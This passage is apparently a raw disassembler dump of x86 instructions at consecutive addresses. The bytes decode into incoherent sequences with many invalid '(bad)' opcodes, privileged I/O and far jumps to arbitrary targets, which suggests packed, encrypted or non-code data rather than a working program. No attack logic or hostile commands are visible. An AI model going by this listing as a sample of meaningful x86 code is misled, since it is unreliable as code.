  419163:	cmp    BYTE PTR [ebx],ah
  419165:	sbb    eax,DWORD PTR [edi+0x794a5e95]
  41916b:	cli    
  41916c:	test   DWORD PTR [edi+ebp*2],0x3468d84b
  419173:	repz test eax,0xeed4e6d7
  419179:	sar    BYTE PTR [ebp+edi*8+0x36cd545e],cl
  419180:	xchg   ebp,eax
  419181:	or     DWORD PTR [eax-0x3c],ebp
  419184:	call   0x33c323aa
  419189:	mov    esp,0x83b10fc7
  41918e:	pusha  
  41918f:	xchg   DWORD PTR [eax+eiz*2+0x4d],esp
  419193:	mov    ah,0x18
  419195:	or     eax,0xab72fc80
  41919a:	hlt    
  41919b:	sbb    eax,0xa9207bee
  4191a0:	jno    0x4191e9
  4191a2:	ins    BYTE PTR es:[edi],dx
  4191a3:	pop    ss
  4191a4:	xchg   DWORD PTR [eax-0x6e],ecx
  4191a7:	jecxz  0x4191d0
  4191a9:	lahf   
  4191aa:	sub    bl,dl
  4191ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ad:	fstp   QWORD PTR [ebp+0x3a2db11d]
  4191b3:	or     al,0x86
  4191b5:	sub    al,0x2
  4191b7:	std    
  4191b8:	fwait
  4191b9:	(bad)
  4191bd:	es retf 
  4191bf:	cmp    ebx,ecx
  4191c1:	inc    edi
  4191c2:	xor    BYTE PTR [esi+0x2a],bl
  4191c5:	jnp    0x4191e4
  4191c7:	push   edi
  4191c8:	retf   0x10eb
  4191cb:	pusha  
  4191cc:	clc    
  4191cd:	fdiv   DWORD PTR [edi]
  4191cf:	xlat   BYTE PTR ds:[ebx]
  4191d0:	pop    eax
  4191d1:	ja     0x419248
  4191d3:	adc    ebx,DWORD PTR [esi]
  4191d5:	(bad)  
  4191d6:	je     0x4191b3
  4191d8:	adc    eax,0x84e0c0ab
  4191dd:	pop    es
  4191de:	xchg   ebx,eax
  4191df:	js     0x419176
  4191e1:	arpl   WORD PTR [ebx-0x77b39b1a],bp
  4191e7:	xor    eax,0x51e07e40
  4191ec:	or     eax,0xc352e1bd
  4191f1:	iret   
  4191f2:	mov    cl,0x31
  4191f4:	inc    eax
  4191f5:	push   ds
  4191f6:	loope  0x4191eb
  4191f8:	and    esp,DWORD PTR [edx]
  4191fa:	jge    0x4191bc
  4191fc:	imul   edx,DWORD PTR [ecx+0x1d],0x4d
  419200:	mov    ecx,0x88fc5fe8
  419205:	hlt    
  419206:	ss ins BYTE PTR es:[edi],dx
  419208:	sbb    DWORD PTR [eax+0x46],ecx
  41920b:	xor    DWORD PTR [ebp+0x1ef90d3b],edi
  419211:	mov    ds:0x1b4103a6,al
  419216:	loopne 0x4191cd
  419218:	pop    ss
  419219:	sbb    eax,0xac0dac84
  41921e:	sbb    edi,DWORD PTR [edi+ebx*8]
  419221:	dec    edi
  419222:	sub    dh,BYTE PTR [edx+edi*1-0x29e014a9]
  419229:	sti    
  41922a:	inc    ebx
  41922b:	pop    ebp
  41922c:	cdq    
  41922d:	lds    ebp,FWORD PTR [ecx]
  41922f:	aaa    
  419230:	push   0xcb014091
  419235:	dec    eax
  419236:	outs   dx,BYTE PTR ds:[esi]
  419237:	mov    ebp,DWORD PTR [esi]
  419239:	mov    bh,0x4c
  41923b:	(bad)  
  41923c:	pop    ds
  41923d:	mov    dl,0x2a
  41923f:	push   ds
  419240:	push   esp
  419241:	test   esp,0xedc8cf5f
  419247:	mov    cl,0xf9
  419249:	and    dh,BYTE PTR [edi]
  41924b:	dec    esp
  41924c:	data16 xor ah,bl
  41924f:	mov    ch,0x4c
  419251:	xchg   DWORD PTR [edx+edx*8+0x77],ebp
  419255:	pop    eax
  419256:	in     al,dx
  419257:	pop    eax
  419258:	sbb    BYTE PTR [ebx],0xf4
  41925b:	sub    esi,eax
  41925d:	test   DWORD PTR [ecx+0x2a],ebp
  419260:	in     al,0x77
  419262:	fsubr  QWORD PTR [ecx+0x300fa5ed]
  419268:	jo     0x4192c4
  41926a:	popa   
  41926b:	and    eax,edi
  41926d:	popf   
  41926e:	pop    esi
  41926f:	ins    DWORD PTR es:[edi],dx
  419270:	jmp    0xfbaf:0x28e1391e
  419277:	push   0xffffffde
  419279:	gs jnp 0x41921e
  41927c:	leave  
  41927d:	push   ebp
  41927e:	test   BYTE PTR [edi],al
  419280:	mov    bh,0xef
  419282:	xor    ch,BYTE PTR [edx+esi*2+0x77]
  419286:	ret    0x4f8
  419289:	shr    ah,1
  41928b:	mov    dl,bh
  41928d:	mov    ch,0x71
  41928f:	inc    edx
  419290:	push   0x4b088436
  419295:	lds    edx,FWORD PTR [ebx]
  419297:	jle    0x41929d
  419299:	je     0x41923f
  41929b:	cld    
  41929c:	or     al,0x10
  41929e:	std    
  41929f:	mov    cl,0x79
  4192a1:	popf   
  4192a2:	(bad)  
  4192a4:	rcl    edi,cl
  4192a6:	in     al,0xb8
  4192a8:	jg     0x419232
  4192aa:	dec    ecx
  4192ab:	add    esi,ebp
  4192ad:	(bad)  
  4192ae:	daa    
  4192af:	xor    eax,eax
  4192b1:	std    
  4192b2:	jle    0x41932a
  4192b4:	and    dh,ah
  4192b6:	aaa    
  4192b7:	(bad)  
  4192b8:	imul   BYTE PTR [ebx]
  4192ba:	xchg   edx,eax
  4192bb:	(bad)  
  4192bc:	mov    edx,0xf04aff
  4192c1:	cli    
  4192c2:	mov    al,0xc5
  4192c4:	adc    ch,BYTE PTR [edi+0x17df975a]
  4192ca:	sbb    eax,0x7d1c19a
  4192cf:	cmp    bl,BYTE PTR [edx]
  4192d1:	sub    al,0xe
  4192d3:	mov    bh,0xcc
  4192d5:	sbb    ch,BYTE PTR [esi+0x5a2d9b3e]
  4192db:	(bad)
  4192e0:	lds    ecx,FWORD PTR [ebx-0x3e]
  4192e3:	mov    ah,BYTE PTR [edi-0x2a]
  4192e6:	int3   
  4192e7:	inc    esp
  4192e8:	xchg   edi,eax
  4192e9:	sub    ebp,DWORD PTR ds:[eax]
  4192ec:	jbe    0x41929f
  4192ee:	and    esi,eax
  4192f0:	inc    edi
  4192f1:	mov    edx,0xe3848ea0
  4192f6:	pop    ebp
  4192f7:	nop
  4192f8:	out    0x8c,eax
  4192fa:	loop   0x41934d
  4192fc:	icebp  
  4192fd:	jns    0x419295
  4192ff:	adc    ch,0xd4
  419302:	out    dx,eax
  419303:	dec    esp
  419304:	mov    DWORD PTR [eax+0x5ff410e2],ebp
  41930a:	fisttp QWORD PTR [edx]
  41930c:	dec    edx
  41930d:	inc    ebp
  41930e:	push   ss
  41930f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419310:	pop    ebx
  419311:	popf   
  419312:	add    al,BYTE PTR [edx-0x7ca19d21]
  419318:	es pop esi
  41931a:	xor    eax,0x323e30ec
  41931f:	adc    BYTE PTR [ebx+0x1d6b996],bh
  419325:	inc    esp
  419326:	pusha  
  419327:	popf   
  419328:	add    eax,0x9271a00c
  41932d:	out    dx,al
  41932e:	popf   
  41932f:	xchg   ecx,eax
  419330:	mov    edi,0xc4778c01
  419335:	xchg   edi,eax
  419336:	adc    eax,0x8b388e0a
  41933b:	mov    al,0xcf
  41933d:	je     0x419341
  41933f:	popa   
  419340:	ror    DWORD PTR [eax],cl
  419342:	cs add eax,0xcf586882
  419348:	mov    al,ds:0x864baee4
  41934d:	test   eax,0x5e9239b1
  419352:	test   BYTE PTR [edi+eax*1-0x5c168b92],ah
  419359:	push   es
  41935a:	xor    DWORD PTR [eax+0x24],eax
  41935d:	ficomp DWORD PTR [edx-0x47]
  419360:	out    dx,eax
  419361:	jle    0x419354
  419363:	es sar al,cl
  419366:	push   esi
  419367:	jl     0x419386
  419369:	mov    ebp,0xd2237c6f
  41936e:	retf   0x57fa
  419371:	jmp    DWORD PTR [edx-0x43]
  419374:	jnp    0x4193c5
  419376:	xor    esi,DWORD PTR [ebp-0x1f639435]
  41937c:	jnp    0x419367
  41937e:	into   
  41937f:	dec    ecx
  419380:	mov    ds:0xe2a96893,al
  419385:	lds    esp,FWORD PTR [esi+0x30c18c7f]
  41938b:	sbb    ecx,DWORD PTR [ebx]
  41938d:	and    bh,dh
  41938f:	(bad)
  419392:	jbe    0x419324
  419394:	pop    edx
  419395:	mov    esi,0x92af6a5b
  41939a:	call   0x8e28893c
  41939f:	test   eax,0x24f63f89
  4193a4:	mov    esp,0xb32ccca5
  4193a9:	xchg   ecx,eax
  4193aa:	nop
  4193ab:	sub    dh,BYTE PTR cs:[edi+0x27d12177]
  4193b2:	pop    edi
  4193b3:	test   bh,0xf5
  4193b6:	fcomp  DWORD PTR [edi+0x380c9eb8]
  4193bc:	scas   al,BYTE PTR es:[edi]
  4193bd:	jbe    0x419423
  4193bf:	or     dl,BYTE PTR [ebp+0x7d]
  4193c2:	call   0x8685:0x1d1e4b44
  4193c9:	loop   0x4193c4
  4193cb:	xor    DWORD PTR [edi-0x60fe6195],0x58db07a2
  4193d5:	mov    bh,0xcc
  4193d7:	jnp    0x419450
  4193d9:	fnstcw WORD PTR [eax+esi*2-0x6d29d004]
  4193e0:	mov    eax,0x31c09a5f
  4193e5:	(bad)  
  4193e6:	add    BYTE PTR [edx],ch
  4193e8:	or     ah,BYTE PTR [edx]
  4193ea:	das    
  4193eb:	hlt    
  4193ec:	push   0x32
  4193ee:	fadd   QWORD PTR [ebp-0x57]
  4193f1:	jb     0x41941f
  4193f3:	and    al,BYTE PTR [edx]
  4193f5:	aam    0xb9
  4193f7:	pop    ds
  4193f8:	or     al,0x1f
  4193fa:	call   0xb423ba93
  4193ff:	push   ecx
  419400:	push   ds
  419401:	enter  0x2d1e,0xb
  419405:	mov    eax,0xf60edcba
  41940a:	jmp    0xef94:0xfc0b753b
  419411:	int3   
  419412:	jo     0x41947a
  419414:	dec    eax
  419415:	jnp    0x419468
  419417:	scas   al,BYTE PTR es:[edi]
  419418:	loopne 0x4193d5
  41941a:	out    dx,al
  41941b:	out    0x85,al
  41941d:	push   0x6829f125
  419422:	sahf   
  419423:	nop
  419424:	jg     0x4193bb
  419426:	cmp    DWORD PTR [edi+0x7a],0x9
  41942a:	shr    DWORD PTR [edi-0x3a],cl
  41942d:	add    BYTE PTR [eax],ah
  41942f:	mov    WORD PTR [ecx],ds
  419431:	ds mov ebp,0x370ed31b
  419437:	fsub   QWORD PTR [ebx+esi*1+0x1b]
  41943b:	adc    DWORD PTR ds:0x6eb012fc,esi
  419441:	dec    esp
  419442:	sbb    BYTE PTR [ebp-0x38],dl
  419445:	add    dl,dl
  419447:	loop   0x4194c4
  419449:	pop    eax
  41944a:	xor    BYTE PTR ds:0x55eed74d,dl
  419450:	push   ecx
  419451:	sbb    ah,BYTE PTR ds:0x6f252030
  419457:	jecxz  0x4194d7
  419459:	pop    esp
  41945a:	test   DWORD PTR [ecx+0x5ecac2f2],edx
  419460:	popa   
  419461:	fsubr  st,st(3)
  419463:	add    ebx,DWORD PTR [ecx]
  419465:	xchg   edx,eax
  419466:	xor    BYTE PTR [ebx],al
  419468:	test   eax,0x51a1df27
  41946d:	push   cs
  41946e:	jg     0x4194c9
  419470:	or     esi,DWORD PTR [esi+0x19]
  419473:	stc    
  419474:	sub    al,0x87
  419476:	gs push ss
  419478:	ins    BYTE PTR es:[edi],dx
  419479:	addr16 inc edx
  41947b:	lock jecxz 0x4194ce
  41947e:	leave  
  41947f:	inc    esp
  419480:	add    eax,0xc798e802
  419485:	fistp  WORD PTR [ecx+0x7c]
  419488:	push   ds
  419489:	fwait
  41948a:	not    BYTE PTR [esi+eax*2]
  41948d:	stos   BYTE PTR es:[edi],al
  41948e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41948f:	ret    
  419490:	jecxz  0x4194f0
  419492:	cs sub ch,bh
  419495:	punpcklbw mm3,DWORD PTR [edx+0x6bb310e4]
  41949c:	scas   al,BYTE PTR es:[edi]
  41949d:	sbb    al,0x20
  41949f:	(bad)  
  4194a0:	cmp    al,0x78
  4194a2:	or     DWORD PTR [bp+di-0x5a75],eax
  4194a7:	cs xlat BYTE PTR ss:[ebx]
  4194aa:	dec    ebp
  4194ab:	xchg   ecx,eax
  4194ac:	es sub dl,0x46
  4194b0:	sub    DWORD PTR [ebx+0x3c],edi
  4194b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194b4:	xchg   esi,eax
  4194b5:	push   ds
  4194b6:	push   edi
  4194b7:	stc    
  4194b8:	call   0x9fca:0x5766591e
  4194bf:	rol    BYTE PTR [edi+ebx*1+0x121741ac],1
  4194c6:	fdivr  st(2),st
  4194c8:	lahf   
  4194c9:	into   
  4194ca:	dec    esp
  4194cb:	add    DWORD PTR [esi+0x7],edi
  4194ce:	inc    edx
  4194cf:	shl    bl,0xe6
  4194d2:	mov    cl,0x6a
  4194d4:	out    0xfb,eax
  4194d6:	and    ebx,DWORD PTR [ecx-0x1bc9a2c6]
  4194dc:	or     WORD PTR [eax-0x80],cx
  4194e0:	pop    esi
  4194e1:	mov    dh,0x76
  4194e3:	loopne 0x419532
  4194e5:	loopne 0x4194c5
  4194e7:	mov    bl,0xc1
  4194e9:	pop    ds
  4194ea:	sahf   
  4194eb:	lahf   
  4194ec:	scas   eax,DWORD PTR es:[edi]
  4194ed:	icebp  
  4194ee:	scas   eax,DWORD PTR es:[edi]
  4194ef:	jbe    0x419511
  4194f1:	fcomp  st(6)
  4194f3:	jnp    0x41952d
  4194f5:	std    
  4194f6:	mov    ds:0x44275891,eax
  4194fb:	fsubr  DWORD PTR [edx-0x1b]
  4194fe:	stos   BYTE PTR es:[edi],al
  4194ff:	dec    eax
  419500:	pop    esp
  419501:	fwait
  419502:	pop    ebx
  419503:	inc    ebp
  419504:	rcl    BYTE PTR [esi+0x20f62e6e],cl
  41950a:	sbb    eax,0x6c3ccae9
  41950f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419510:	mov    ds:0x1a935200,al
  419515:	sub    eax,0xc9f26684
  41951a:	mov    ds:0x280f7ac1,al
  41951f:	cmc    
  419520:	xchg   edx,eax
  419521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419522:	test   DWORD PTR [edi+edx*4-0x2c4dcdb6],ebp
  419529:	add    esi,eax
  41952b:	mov    eax,0x395812ac
  419530:	inc    edx
  419531:	test   bl,dh
  419533:	jo     0x41958f
  419535:	lods   al,BYTE PTR ds:[esi]
  419536:	push   ecx
  419537:	or     DWORD PTR [edi],ebp
  419539:	inc    esi
  41953a:	sbb    ah,BYTE PTR [edi]
  41953c:	or     DWORD PTR ds:[edx-0x17],edx
  419540:	and    BYTE PTR [edi-0xc],ah
  419543:	push   ss
  419544:	arpl   WORD PTR [eax],dx
  419546:	push   es
  419547:	lds    edi,FWORD PTR [ebp+0x6a]
  41954a:	sbb    BYTE PTR [esp+ebp*2],dh
  41954d:	mov    ecx,0x6c5144bf
  419552:	das    
  419553:	or     al,0xe2
  419555:	jl     0x419561
  419557:	arpl   WORD PTR [ecx+0x433e18d4],sp
  41955d:	lods   al,BYTE PTR ds:[esi]
  41955e:	mov    ebx,0xec24a209
  419563:	push   es
  419564:	push   ebp
  419565:	mov    ebx,0x7102e18b
  41956a:	jg     0x419520
  41956c:	cld    
  41956d:	and    dh,BYTE PTR [ebp*2+0x6f0aae70]
  419574:	nop
  419575:	repz xor al,0x57
  419578:	pop    es
  419579:	enter  0xc78c,0xc4
  41957d:	push   0xc9275ee9
  419582:	retf   0xab86
  419585:	mov    ah,0x2
  419587:	mov    cl,0xc7
  419589:	js     0x419533
  41958b:	(bad)  
  41958c:	sti    
  41958d:	out    dx,eax
  41958e:	push   ebp
  41958f:	rol    DWORD PTR [edi],0x7a
  419592:	(bad)  
  419593:	mov    dh,0xef
  419595:	jle    0x4195ea
  419597:	jne    0x4195a3
  419599:	adc    eax,0xbeec23e7
  41959e:	mov    ah,0x42
  4195a0:	jmp    0xa57359fb
  4195a5:	nop
  4195a6:	push   cs
  4195a7:	sar    BYTE PTR [edx+0x45],0x4a
  4195ab:	shr    DWORD PTR [ebx+0x77],cl
  4195ae:	cmc    
  4195af:	retf   0xd9ab
  4195b2:	dec    edi
  4195b3:	ret    0xd62d
  4195b6:	(bad)  
  4195b7:	sbb    ah,BYTE PTR [ebx+0xa]
  4195ba:	gs jb  0x419619
  4195bd:	test   dh,0x17
  4195c0:	dec    edi
  4195c1:	test   eax,0x6f712c56
  4195c6:	hlt    
  4195c7:	xor    DWORD PTR [esi],esi
  4195c9:	jnp    0x4195f2
  4195cb:	fwait
  4195cc:	dec    ecx
  4195cd:	cmp    BYTE PTR [edi+0x2a],dl
  4195d0:	adc    al,0x59
  4195d2:	sbb    al,BYTE PTR [edi+0x3fa9752b]
  4195d8:	pop    ds
  4195d9:	loop   0x4195cf
  4195db:	out    0x34,al
  4195dd:	pop    ds
  4195de:	rol    DWORD PTR [ebx+ebx*2+0x3],0xaa
  4195e3:	jge    0x419654
  4195e5:	adc    al,0xcb
  4195e7:	(bad)  
  4195e8:	enter  0xc00c,0x56
  4195ec:	sbb    edx,DWORD PTR [edi-0x609dc0d0]
  4195f2:	jno    0x4195ab
  4195f4:	das    
  4195f5:	or     dh,BYTE PTR [ecx]
  4195f7:	inc    ebx
  4195f8:	pop    ebx
  4195f9:	test   BYTE PTR [eax-0x25],0x5a
  4195fd:	fiadd  DWORD PTR [ebx-0x50834f23]
  419603:	jecxz  0x419662
  419605:	xchg   edi,eax
  419606:	ins    BYTE PTR es:[edi],dx
  419607:	lods   eax,DWORD PTR ds:[esi]
  419608:	add    DWORD PTR [ebp-0x1e],ebp
  41960b:	mov    edx,0xa18b3f0a
  419610:	outs   dx,DWORD PTR ds:[esi]
  419611:	std    
  419612:	fucompp 
  419614:	repz out 0x5e,al
  419617:	mov    ch,0xc7
  419619:	sbb    eax,0x90fb5df6
  41961e:	fstp   TBYTE PTR [ecx]
  419620:	stos   BYTE PTR es:[edi],al
  419621:	daa    
  419622:	mov    ecx,?
  419624:	in     al,dx
  419625:	cmp    eax,DWORD PTR [ebx+0x5b]
  419628:	mov    cl,0x95
  41962a:	std    
  41962b:	add    ebp,0xb1c413c2
  419631:	aas    
  419632:	popa   
  419633:	repz sbb dh,BYTE PTR [ebp+0x198fe1d4]
  41963a:	hlt    
  41963b:	mov    edx,DWORD PTR [edx+0x2464aa8e]
  419641:	and    bl,dl
  419643:	and    BYTE PTR [ecx+0x61],ah
  419646:	adc    ebx,ebx
  419648:	mov    cs:0xb0800acd,eax
  41964e:	rcl    DWORD PTR [ebx-0xd2e0624],0xf7
  419655:	loop   0x41960c
  419657:	add    BYTE PTR [edi+0x2dd0fbae],bh
  41965d:	cs inc ecx
  41965f:	add    edx,esp
  419661:	jecxz  0x41964d
  419663:	xchg   ecx,eax
  419664:	sar    DWORD PTR [ebx+0x26],cl
  419667:	ins    BYTE PTR es:[edi],dx
  419668:	in     al,dx
  419669:	fadd   QWORD PTR [eax+0x49eb005d]
  41966f:	xchg   ebx,eax
  419670:	push   ebp
  419671:	push   ebx
  419672:	mov    edi,0xe2163528
  419677:	mov    ah,0xc9
  419679:	fisttp WORD PTR [edx+0x2c]
  41967c:	inc    edi
  41967d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41967e:	mov    esi,0x8c265b89
  419683:	jg     0x41963c
  419685:	and    edx,DWORD PTR [ebp-0x43]
  419688:	mov    ch,ah
  41968a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968b:	fimul  WORD PTR [esi+eiz*2]
  41968e:	add    DWORD PTR [edi+0x51],ebp
  419691:	pop    ebp
  419692:	xor    eax,0x1cb575e5
  419697:	push   0x3966c507
  41969c:	shr    BYTE PTR [eax],cl
  41969e:	sub    al,0x13
  4196a0:	cmp    eax,0x6760944
  4196a5:	push   ds
  4196a6:	shl    BYTE PTR [ebp*1+0x2f75fb65],1
  4196ad:	pop    ds
  4196ae:	xlat   BYTE PTR ds:[ebx]
  4196af:	dec    edi
  4196b0:	mov    ch,0x2a
  4196b2:	popa   
  4196b3:	or     BYTE PTR [ebp-0x76e9c921],bh
  4196b9:	fs jl  0x419649
  4196bc:	push   es
  4196bd:	rcr    DWORD PTR [ecx+0x6fbb87e4],0x4
  4196c4:	(bad)  
  4196c5:	aaa    
  4196c6:	ficomp WORD PTR [esi]
  4196c8:	or     dh,dl
  4196ca:	nop
  4196cb:	and    dh,cl
  4196cd:	ror    BYTE PTR [esp+0x6df8d6dd],1
  4196d4:	add    BYTE PTR [ebx-0x4a],al
  4196d7:	dec    esp
  4196d8:	sub    eax,0xba8281a7
  4196dd:	out    0xd1,al
  4196df:	cmp    bh,BYTE PTR [esi-0x95903db]
  4196e5:	xor    DWORD PTR [esi],ecx
  4196e7:	add    BYTE PTR [edi],dl
  4196e9:	push   es
  4196ea:	xor    ebp,DWORD PTR [edi]
  4196ec:	mov    BYTE PTR [esi-0x5f],al
  4196ef:	mov    cl,BYTE PTR [edi+0x25620eec]
  4196f5:	inc    esi
  4196f6:	dec    esi
  4196f7:	ds xchg edx,eax
  4196f9:	cmp    edi,ebp
  4196fb:	cmp    edx,DWORD PTR [edi]
  4196fd:	pushf  
  4196fe:	fisttp WORD PTR [eax+0x3b]
  419701:	in     al,dx
  419702:	ins    BYTE PTR es:[edi],dx
  419703:	dec    edx
  419704:	or     ah,BYTE PTR [eax]
  419706:	or     al,bh
  419708:	or     DWORD PTR [edi-0x56290f31],ecx
  41970e:	or     ebx,ebx
  419710:	call   0x240839c9
  419715:	pop    esp
  419716:	int    0x31
  419718:	in     al,dx
  419719:	ror    DWORD PTR [edi],0xbb
  41971c:	ins    DWORD PTR es:[edi],dx
  41971d:	hlt    
  41971e:	xchg   ebx,eax
  41971f:	mov    BYTE PTR [ecx+ecx*1+0xd],dh
  419723:	scas   eax,DWORD PTR es:[edi]
  419724:	jecxz  0x4196fc
  419726:	push   es
  419727:	and    DWORD PTR [edi+0xe],ebx
  41972a:	and    al,0xfd
  41972c:	adc    DWORD PTR [eax-0x73],esp
  41972f:	rcr    edi,1
  419731:	and    ch,BYTE PTR [esi]
  419733:	jecxz  0x419765
  419735:	jg     0x419769
  419737:	test   eax,0xcdf5adb7
  41973c:	xor    BYTE PTR [eax+0x6021b3d5],cl
  419742:	int    0x79
  419744:	fisub  WORD PTR [edi]
  419746:	sub    DWORD PTR [ebx-0x6dc99501],eax
  41974c:	rol    BYTE PTR [eax],1
  41974e:	out    0x38,al
  419750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419751:	fnsave [ebx+ecx*2]
  419754:	psubsw mm3,mm7
  419757:	test   BYTE PTR [ebx-0x27c7c768],dh
  41975d:	mov    al,0x80
  41975f:	xlat   BYTE PTR gs:[ebx]
  419761:	in     eax,0xae
  419763:	mov    cl,0xd8
  419765:	mov    edx,0xa64ef974
  41976a:	lods   eax,DWORD PTR ds:[esi]
  41976b:	ss repz and edi,0xe00f92b6
  419773:	push   ebp
  419774:	inc    esi
  419775:	sub    eax,0x3e797390
  41977b:	pop    edx
  41977c:	(bad)  
  41977d:	jmp    0x4664:0x894dafd5
  419784:	push   ss
  419785:	push   edi
  419786:	dec    ebp
  419787:	ins    DWORD PTR es:[edi],dx
  419788:	xchg   ebp,eax
  419789:	out    0x92,al
  41978b:	jge    0x4197df
  41978d:	adc    al,0x29
  41978f:	sbb    BYTE PTR [ebx+0x1c],cl
  419792:	loopne 0x4197b4
  419794:	mov    al,0x70
  419796:	arpl   bx,bp
  419798:	inc    edi
  419799:	imul   edi,DWORD PTR [esi+0x27],0xce744256
  4197a0:	lods   eax,DWORD PTR ds:[esi]
  4197a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197a2:	xchg   esp,eax
  4197a3:	mov    ecx,0xd9d13af1
  4197a8:	out    dx,eax
  4197a9:	leave  
  4197aa:	(bad)  
  4197ab:	cdq    
  4197ac:	and    eax,0x2a23c0ef
  4197b1:	inc    esi
  4197b2:	sub    BYTE PTR [eax],0x45
  4197b5:	gs sbb al,bl
  4197b8:	mov    esp,0xaa4aa9f5
  4197bd:	fsubr  DWORD PTR [edi+0x5f]
  4197c0:	adc    esp,DWORD PTR [ecx-0x5546757d]
  4197c6:	sahf   
  4197c7:	sbb    DWORD PTR [esi+0x656eb25f],ebp
  4197cd:	sahf   
  4197ce:	ss cli 
  4197d0:	sti    
  4197d1:	adc    ecx,eax
  4197d3:	add    al,0x4d
  4197d5:	(bad)  
  4197d6:	pop    eax
  4197d7:	imul   esp,esi,0x59
  4197da:	lds    edi,FWORD PTR [ecx]
  4197dc:	pop    edi
  4197dd:	xchg   ebx,eax
  4197de:	in     al,0xc6
  4197e0:	pop    ss
  4197e1:	or     bh,BYTE PTR [ecx]
  4197e3:	test   DWORD PTR [edx-0x6e],edi
  4197e6:	fdiv   DWORD PTR [edi+0x2697a8d]
  4197ec:	push   edx
  4197ed:	pop    edx
  4197ee:	pop    ds
  4197ef:	sbb    al,BYTE PTR [eax+0x2c]
  4197f2:	call   FWORD PTR [edx]
  4197f4:	push   edi
  4197f5:	out    dx,eax
  4197f6:	(bad)  
  4197f7:	dec    ebp
  4197f8:	inc    DWORD PTR [edx-0x4c366179]
  4197fe:	mov    edi,esi
  419800:	pop    ebp
  419801:	or     eax,0xd91427fa
  419806:	test   al,0x94
  419808:	sub    BYTE PTR [edi+0xcad3ae],dh
  41980e:	inc    ebx
  41980f:	sub    edi,eax
  419811:	cmp    ch,BYTE PTR [eax+0x3d]
  419814:	je     0x419802
  419816:	hlt    
  419817:	in     al,dx
  419818:	jmp    0x41979e
  41981a:	out    0x41,eax
  41981c:	mov    al,ds:0x348d94ef
  419821:	jb     0x4197ff
  419823:	clc    
  419824:	cdq    
  419825:	cmp    dl,cl
  419827:	out    dx,eax
  419828:	fwait
  419829:	jl     0x4197e4
  41982b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41982c:	jns    0x419816
  41982e:	rcr    BYTE PTR [esp+ecx*4+0x4],0x2a
  419833:	add    dl,BYTE PTR [esi+ebp*2-0x56]
  419837:	mov    dh,0x22
  419839:	nop
  41983a:	std    
  41983b:	in     eax,dx
  41983c:	jmp    0xc363:0x8850be33
  419843:	pop    ds
  419844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419845:	imul   eax,DWORD PTR [edx+ebp*4],0xffffffc6
  419849:	pop    ds
  41984a:	pusha  
  41984b:	add    al,0xc6
  41984d:	mov    al,0x82
  41984f:	mov    al,ds:0x55e8207f
  419854:	and    al,0x6e
  419856:	dec    esi
  419857:	arpl   WORD PTR [edx],bp
  419859:	mov    ch,0x97
  41985b:	imul   esp,edi,0x8065e294
  419861:	jmp    0xc4ad1847
  419866:	push   ebx
  419867:	push   ebp
  419868:	mov    edx,0xef82c638
  41986d:	dec    esi
  41986e:	xchg   ebx,eax
  41986f:	mov    al,ds:0xf4b18533
  419874:	push   edx
  419875:	int3   
  419876:	or     ch,cl
  419878:	mov    bh,0x2d
  41987a:	dec    edx
  41987b:	lahf   
  41987c:	lock mov ebp,0xb3898edb
  419882:	mov    edi,0x642320eb
  419887:	ds jp  0x419838
  41988a:	mov    ah,0x8c
  41988c:	and    eax,0x9b9e0137
  419891:	add    eax,0xdb3a39a4
  419896:	inc    ebp
  419897:	dec    esi
  419898:	jp     0x4198fa
  41989a:	jl     0x4198d5
  41989c:	push   0x2c17f433
  4198a1:	loope  0x4198a1
  4198a3:	hlt    
  4198a4:	cmc    
  4198a5:	push   eax
  4198a6:	sbb    bh,bl
  4198a8:	or     al,0x49
  4198aa:	aam    0xec
  4198ac:	jbe    0x4198ef
  4198ae:	test   DWORD PTR [ebp+0x2e],ebx
  4198b1:	popf   
  4198b2:	retf   
  4198b3:	or     eax,0x3afb78e9
  4198b8:	xor    BYTE PTR [ebx+ebx*4],dh
  4198bb:	addr16 dec esp
  4198bd:	and    cl,BYTE PTR [eax+0x25a05749]
  4198c3:	in     eax,0xca
  4198c5:	stos   DWORD PTR es:[edi],eax
  4198c6:	in     al,0x2b
  4198c8:	push   es
  4198c9:	test   dh,bl
  4198cb:	mov    esp,0x8ece4617
  4198d0:	jae    0x4198e1
  4198d2:	test   BYTE PTR [ecx-0xe],dl
  4198d5:	jb     0x4198d2
  4198d7:	jp     0x41991f
  4198d9:	mov    eax,0xe08ba0b4
  4198de:	scas   al,BYTE PTR es:[edi]
  4198df:	test   eax,0x2b7e5c71
  4198e4:	repnz pop ss
  4198e6:	pusha  
  4198e7:	mov    ebp,0x723123c8
  4198ec:	push   ss
  4198ed:	pop    ss
  4198ee:	aam    0x18
  4198f0:	push   esp
  4198f1:	cmp    al,0x8f
  4198f3:	cwde   
  4198f4:	push   edi
  4198f5:	and    DWORD PTR [esp+esi*1],ecx
  4198f8:	pop    ebx
  4198f9:	mov    dl,BYTE PTR [eax+0x3c]
  4198fc:	cld    
  4198fd:	jne    0x41994f
  4198ff:	jnp    0x419930
  419901:	jg     0x4198db
  419903:	jbe    0x4198d8
  419905:	aaa    
  419906:	inc    ebp
  419907:	cmp    dl,BYTE PTR [eax]
  419909:	adc    al,0xcf
  41990b:	dec    edi
  41990c:	push   ebx
  41990d:	ret    
  41990e:	loope  0x4198c3
  419910:	cmp    BYTE PTR [edi],al
  419912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419913:	fsubr  QWORD PTR [ebx]
  419915:	int    0x54
  419917:	in     al,dx
  419918:	cli    
  419919:	out    dx,eax
  41991a:	lock popa 
  41991c:	sti    
  41991d:	aad    0x4d
  41991f:	rol    BYTE PTR [esi+0x69cb3fd6],cl
  419925:	cmp    edi,edx
  419927:	fs lahf 
  419929:	mov    WORD PTR [ebx+0x45],?
  41992c:	jge    0x41991a
  41992e:	and    cl,bl
  419930:	push   ds
